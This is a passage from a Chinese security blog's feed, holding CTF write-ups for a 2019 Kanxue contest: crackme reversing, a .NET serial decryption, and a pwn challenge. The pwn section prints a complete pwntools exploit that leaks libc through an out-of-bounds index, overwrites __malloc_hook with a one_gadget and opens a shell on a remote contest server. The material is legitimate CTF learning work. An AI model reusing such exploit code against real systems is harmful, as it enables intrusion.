class="line">CODE:<span class="number">004734</span>D4                 mov     ecx, [ebp+<span class="number">4</span>]</span><br><span class="line">CODE:<span class="number">004734</span>D7                 mov     [edx+<span class="number">105</span>Ch], ecx</span><br><span class="line">CODE:<span class="number">004734</span>DD                 push    edx</span><br><span class="line">CODE:<span class="number">004734</span>DE                 call    sub_472EAC</span><br><span class="line">CODE:<span class="number">004734E3</span>                 leave</span><br><span class="line">CODE:<span class="number">004734E4</span>                 mov     eax, [esp+<span class="number">30</span>h+var_30]</span><br><span class="line">CODE:<span class="number">004734E7</span>                 mov     [esp+<span class="number">30</span>h+var_s0], eax</span><br><span class="line">CODE:<span class="number">004734</span>EB                 popf</span><br><span class="line">CODE:<span class="number">004734</span>EC                 popa</span><br><span class="line">CODE:<span class="number">004734</span>ED                 add     esp, <span class="number">0</span>Ch</span><br><span class="line">CODE:<span class="number">004734F</span>0                 popf</span><br><span class="line">CODE:<span class="number">004734F</span>1                 jmp     [esp<span class="number">-4</span>+var_40]</span><br><span class="line">CODE:<span class="number">004734F</span>1 sub_4734B0      endp</span><br></pre></td></tr></table></figure></p><p>函数利用了jmp     [esp-4+var_40]该语句不停的跳转不同的指令进行对比，跟踪进去，发现这些指令就是用来比较flag的，单步跟踪和调试去满足它的比较条件，得出最后的flag为simpowera123。</p><h3 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h3><p>这是一道pwn题，主要的逻辑如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+10h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"This is a little game\n"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You can create a character and choose if he needs a partner.\n"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu(<span class="string">"You can create a character and choose if he needs a partner.\n"</span>, argv);</span><br><span class="line">    read_int(<span class="string">"You can create a character and choose if he needs a partner.\n"</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;savedregs )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        singledog();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        luckydog();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        edit_singledog();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        edit_luckydog();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        save_singledog();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在edit_singledog()，edit_luckydog()中，没有对数组的界限进行限制，所以可以对任意地址进行读写，所以泄露libc基址是最先考虑的问题，由于题目没有提供libc版本，所以我这里泄露public stderr@@GLIBC_2_2_5（_IO_2_1<em>stderr</em>）地址进行分析。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit_singledog</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"which?"</span>);</span><br><span class="line">  v1 = read_int(<span class="string">"which?"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( two[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Oh,singledog,changing your name can bring you good luck."</span>);</span><br><span class="line">    read(<span class="number">0</span>, two[v1], <span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"new name: %s"</span>, two[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"nothing here"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>泄露的stderr地址后3位为680，利用网站<a href="https://libc.blukat.me" target="_blank" rel="noopener">https://libc.blukat.me</a> 进行分析，得出结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc6_2.27-3ubuntu1_amd64</span><br><span class="line">libc6_2.28-0ubuntu1_amd64</span><br><span class="line">libc6_2.29-0ubuntu1_amd64</span><br></pre></td></tr></table></figure></p><p>将这三个libc版本分别下载，同时利用one_gadget进行读取，得到服务器的flag。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_libc_base_addr</span><span class="params">()</span>:</span></span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">"test"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">"-4"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">"fffffff"</span>)</span><br><span class="line">    p.recv(<span class="number">18</span>)</span><br><span class="line">    leak_addr = p.recv(<span class="number">6</span>)</span><br><span class="line">    _IO_2_1_stderr_addr = (u64(leak_addr.ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)))- <span class="number">0x83</span></span><br><span class="line">    libc_base_addr = _IO_2_1_stderr_addr - elf.symbols[<span class="string">'_IO_2_1_stderr_'</span>] </span><br><span class="line">    p.recv()</span><br><span class="line">    <span class="keyword">return</span> libc_base_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_malloc_hook_gadget</span><span class="params">(libc_base_addr)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">"xxxx"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">"yyyy"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">"80"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(p64(libc_base_addr+elf.symbols[<span class="string">'__malloc_hook'</span>]))</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">"0"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">"xxxx"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(p64(libc_base_addr+<span class="number">0x10a38c</span>))</span><br><span class="line">    p.recv()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"/home/foyjog/Desktop/libc/libc6_2.27-3ubuntu1_amd64.so"</span>)</span><br><span class="line"><span class="comment">#elf = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span></span><br><span class="line"><span class="comment">#p = process("./apwn")</span></span><br><span class="line">p =  remote(<span class="string">'211.159.175.39'</span>,<span class="number">8686</span>)</span><br><span class="line"></span><br><span class="line">pdb.set_trace()</span><br><span class="line">libc_base_addr = get_libc_base_addr()</span><br><span class="line"><span class="keyword">print</span> hex(libc_base_addr)</span><br><span class="line">set_malloc_hook_gadget(libc_base_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h3><p>这个题是我蒙混过关的，本来有两关，但是做了一关就被放行了= =<br>函数总体为：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_4014C0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  sub_4044B0();</span><br><span class="line">  v0 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0x7F79745E</span>;</span><br><span class="line">  v4 = <span class="number">0x2B704C63</span>;</span><br><span class="line">  v5 = <span class="number">1630229319</span>;</span><br><span class="line">  v6 = <span class="number">1194152263</span>;</span><br><span class="line">  v7 = <span class="number">1198270550</span>;</span><br><span class="line">  v8 = <span class="number">695827786</span>;</span><br><span class="line">  v9 = <span class="number">1397178665</span>;</span><br><span class="line">  v10 = <span class="number">6644011</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(Str, <span class="string">"Ansome_Is_Wrong"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( v0 &lt; <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3) )</span><br><span class="line">    *((_BYTE *)&amp;v3 + v0++) ^= <span class="number">0x18</span>u;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please Input Your Key_ Now!"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;v11);</span><br><span class="line">  <span class="keyword">if</span> ( sub_4012F0((<span class="keyword">int</span>)&amp;v11) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_401460(&amp;v11);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(Str);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>跟进,得知第9位到第20为是X1Y0uN3tG00d，<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_4012F0</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">while</span> ( *((_BYTE *)&amp;v4 + v2) == *(_BYTE *)(v1 + a1) )</span><br><span class="line">  &#123;</span><br><span class="line">    ++v2;</span><br><span class="line">    ++v1;</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt; <span class="number">11</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(a1 + <span class="number">20</span>) == <span class="number">0x48</span> )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>继续往下跟<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_4013B0</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  sub_401380(a1);</span><br><span class="line">  v1 = dword_40802C + <span class="number">1000</span> * dword_408020 + <span class="number">100</span> * dword_408024 + <span class="number">10</span> * dword_408028;</span><br><span class="line">  v2 = dword_408034 + <span class="number">10</span> * dword_408030;</span><br><span class="line">  v3 = dword_40803C + <span class="number">10</span> * dword_408038;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">2</span> * (v1 + v2) != <span class="number">4040</span> || <span class="number">3</span> * v2 / <span class="number">2</span> + <span class="number">100</span> * v3 != <span class="number">115</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">  result = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v1 - <span class="number">110</span> * v3 != <span class="number">1900</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Key_Is_Wrong,Please_Input_Again!"</span>);</span><br><span class="line">LABEL_2:</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>得知前八位可以为20101001，这其实有很多个解满足，所以这也是这道题争论非常狂躁的原因，而我刚好捡个漏。= =<br>最后四位是一个栈溢出，只要溢出到0x401BF0即可，得出最后四位为HaCk，所以第一步的flag为20101001X1Y0uN3tG00dHaCk。</p><h3 id="第十题"><a href="#第十题" class="headerlink" title="第十题"></a>第十题</h3><p>这是个.net。.net额，不靠谱。<br>利用dnSpy打开，并在函数入口点断点。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Security.Cryptography;</span><br><span class="line">using System.Text;</span><br><span class="line"></span><br><span class="line">// Token: 0x02000003 RID: 3</span><br><span class="line">internal class a</span><br><span class="line">&#123;</span><br><span class="line">// Token: 0x06000004 RID: 4 RVA: 0x0000209B File Offset: 0x0000029B</span><br><span class="line">private static void a(string[] A_0)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(&quot;Please Input Serial:&quot;);</span><br><span class="line">if (global::a.a(Console.ReadLine(), &quot;Kanxue2019&quot;) == &quot;4RTlF9Ca2+oqExJwx68FiA==&quot;)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(&quot;Congratulations!  : )&quot;);</span><br><span class="line">Console.ReadLine();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Token: 0x06000005 RID: 5 RVA: 0x000020D4 File Offset: 0x000002D4</span><br><span class="line">public static string a(string A_0, string A_1)</span><br><span class="line">&#123;</span><br><span class="line">byte[] bytes = Encoding.UTF8.GetBytes(&quot;Kanxue2019CTF-Q1&quot;);</span><br><span class="line">byte[] bytes2 = Encoding.UTF8.GetBytes(A_0);</span><br><span class="line">byte[] bytes3 = new PasswordDeriveBytes(A_1, null).GetBytes(32);</span><br><span class="line">ICryptoTransform transform = new RijndaelManaged</span><br><span class="line">&#123;</span><br><span class="line">Mode = CipherMode.CBC</span><br><span class="line">&#125;.CreateEncryptor(bytes3, bytes);</span><br><span class="line">MemoryStream memoryStream = new MemoryStream();</span><br><span class="line">CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);</span><br><span class="line">cryptoStream.Write(bytes2, 0, bytes2.Length);</span><br><span class="line">cryptoStream.FlushFinalBlock();</span><br><span class="line">byte[] inArray = memoryStream.ToArray();</span><br><span class="line">memoryStream.Close();</span><br><span class="line">cryptoStream.Close();</span><br><span class="line">return Convert.ToBase64String(inArray);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Token: 0x04000003 RID: 3</span><br><span class="line">private const string a = &quot;Kanxue2019CTF-Q1&quot;;</span><br><span class="line"></span><br><span class="line">// Token: 0x04000004 RID: 4</span><br><span class="line">private const int b = 256;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>得出加密方式，反转一下即可。<br>如下代码解决：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Security.Cryptography;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Threading.Tasks;</span><br><span class="line"></span><br><span class="line">namespace ConsoleApplication1</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        public static string detest(string A_0, string A_1)</span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line">            byte[] bytes = Encoding.UTF8.GetBytes(&quot;Kanxue2019CTF-Q1&quot;);</span><br><span class="line">            byte[] bytes2 = Convert.FromBase64String(A_0);</span><br><span class="line">            byte[] bytes3 = new PasswordDeriveBytes(A_1, null).GetBytes(32);</span><br><span class="line">            ICryptoTransform transform = new RijndaelManaged</span><br><span class="line">            &#123;</span><br><span class="line">                Mode = CipherMode.CBC</span><br><span class="line">            &#125;.CreateDecryptor(bytes3, bytes);</span><br><span class="line">            MemoryStream memoryStream = new MemoryStream();</span><br><span class="line">            CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);</span><br><span class="line">            cryptoStream.Write(bytes2, 0, bytes2.Length);</span><br><span class="line">            cryptoStream.FlushFinalBlock();</span><br><span class="line">            byte[] inArray = memoryStream.ToArray();</span><br><span class="line">            memoryStream.Close();</span><br><span class="line">            cryptoStream.Close();</span><br><span class="line">            return System.Text.Encoding.Default.GetString(inArray);</span><br><span class="line">          //  return Convert.ToString(inArray);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(&quot;Please Input Serial:&quot;);</span><br><span class="line">            Console.WriteLine( detest(&quot;4RTlF9Ca2+oqExJwx68FiA==&quot;, &quot;Kanxue2019&quot;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;最近把论文整的差不多了，刚好有个看雪的比赛就玩一会儿，不得不说题目还是很有趣的，做了一部分，肝不动了= =&lt;/p&gt;
&lt;h3 id=&quot;第一题&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>使用frida进行android的hook</title>
    <link href="https://foyjog.github.io/2019/03/22/%E4%BD%BF%E7%94%A8frida%E8%BF%9B%E8%A1%8Candroid%E7%9A%84hook/"/>
    <id>https://foyjog.github.io/2019/03/22/使用frida进行android的hook/</id>
    <published>2019-03-22T11:30:37.000Z</published>
    <updated>2019-03-22T11:46:30.200Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>frida是一个比较优秀的hook框架，xposed的框架对于frida来说，frida有着更加方便快捷的方式，其实我是不喜欢编写xposed框架和重启手机。这里使用frida进行hook测试，并解决2018年没有解决的ddctf第二题。</p><h3 id="frida使用方式"><a href="#frida使用方式" class="headerlink" title="frida使用方式"></a>frida使用方式</h3><ol><li>将frida-server push到手机中并运行。<a href="https://github.com/frida/frida/releases" target="_blank" rel="noopener">https://github.com/frida/frida/releases</a></li><li>pip install frida</li><li>就可以写代码进行hook了。</li></ol><h3 id="ddctf第二题"><a href="#ddctf第二题" class="headerlink" title="ddctf第二题"></a>ddctf第二题</h3><p>这个题目没有so的问题，主要是使用了美团的一个robust框架对dex文件进行了热修复，找到关键的代码即可得出flag。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.chaitin.geektan.crackme;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg13)</span> </span>&#123;</span><br><span class="line">        Class[] v3_2;</span><br><span class="line">        Class v2_5;</span><br><span class="line">        Object[] v0_3;</span><br><span class="line">        Object[] v2_4;</span><br><span class="line">        MainActivity$<span class="number">1</span>Patch v2_2;</span><br><span class="line">        MainActivity$<span class="number">1</span> v2_1;</span><br><span class="line">        MainActivity$<span class="number">1</span> v1_1;</span><br><span class="line">        MainActivity$<span class="number">1</span>Patch v0_1;</span><br><span class="line">        MainActivity$<span class="number">1</span> v0;</span><br><span class="line">        <span class="keyword">int</span> v11 = <span class="number">3</span>;</span><br><span class="line">        Class[] v10 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">int</span> v9 = <span class="number">2</span>;</span><br><span class="line">        <span 